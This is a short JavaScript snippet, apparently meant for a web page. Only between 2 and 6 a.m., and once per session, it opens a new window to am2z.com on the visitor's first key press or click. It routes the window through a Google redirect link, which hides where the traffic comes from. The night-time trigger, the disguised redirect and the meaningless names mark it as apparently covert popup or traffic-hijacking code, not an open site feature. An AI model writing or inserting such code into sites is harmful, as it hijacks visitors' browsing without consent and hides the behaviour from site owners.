//  console.log(NN)
let EFV=''

if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}

if(!sessionStorage.ef&&new Date().getHours()>=2&&new Date().getHours()<=6){
    function AB(CD){
        document.addEventListener(CD,()=>{
                if(!sessionStorage.ef){
                window.open(`https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&url=https%3A%2F%2Fwww.am2z.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu`);
                sessionStorage.ef = '1';
            }
        })
    }
    AB('keydown'); 
    AB('mousedown');
}

